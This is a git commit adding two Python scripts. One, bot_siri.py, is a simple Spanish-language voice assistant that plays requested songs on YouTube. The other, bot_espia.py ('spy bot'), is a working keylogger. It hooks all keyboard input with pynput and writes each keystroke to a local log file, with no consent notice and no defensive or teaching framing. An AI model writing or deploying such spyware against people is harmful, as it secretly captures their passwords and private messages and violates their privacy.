84152f90af919ca8689babefb4b53904e04c4229
leonardos4enz <leonardorsaenz@gmail.com>
2023-09-10 20:46:23 -0600

    espia/siri

---
+++ bot_espia.py
@@ -0,0 +1,34 @@
+from pynput.keyboard import Key, Listener
+
+keys = []
+uniqueKeys = [' ', ' <- ', '/n']
+
+def presionar_tecla(key):
+    keys.append(key)
+    convert_string(keys)
+
+def convert_string(keys):
+    with open('log.txt', 'w') as logfile:
+        for key in keys:
+            key = str(key).replace("'", "")
+            logfile.write(switch_case(key))
+
+
+def soltar_tecla(key):
+    if key == Key.esc:
+        return False
+
+def switch_case(key):
+    if key == 'Key.space':
+        resultado = " "
+    elif key == 'Key.backspace':
+        resultado = " <- "
+    elif key == 'Key.enter':
+        resultado = "\n"
+    else:
+        resultado = key  # Esto es como el caso "default" en un switch
+
+    return resultado
+
+with Listener(on_press=presionar_tecla, on_release=soltar_tecla) as listener:
+    listener.join()
---
+++ bot_siri.py
@@ -0,0 +1,50 @@
+import speech_recognition as sr
+import pyttsx3
+import pywhatkit
+import webbrowser
+
+
+name = 'Diana'
+listener = sr.Recognizer()
+engine = pyttsx3.init()
+
+voices = engine.getProperty('voices')
+engine.setProperty('voice', voices[2].id)
+
+
+def talk(text):
+    engine.say(text)
+    engine.runAndWait()
+
+
+def listen():
+    try:
+        with sr.Microphone() as source:
+            print("Escuchando...")
+            voice = listener.listen(source)
+            rec = listener.recognize_google(voice)
+            rec = rec.lower()
+            if name in rec:
+                rec = rec.replace(name, '')
+                print(rec)
+            return rec
+    except sr.UnknownValueError:
+        print("No se ha entendido la entrada de voz.")
+        return ""
+    except sr.RequestError as e:
+        print(f"Error en la solicitud de reconocimiento de voz: {e}")
+        return ""
+
+def get_command():
+    rec = input().lower()
+    return rec
+
+def run():
+    rec = listen()
+    if 'reproduce' in rec:
+        music = rec.replace('reproduce ', '')
+        talk('Reproduciendo ' + music)
+        pywhatkit.playonyt(music)
+
+run()
+
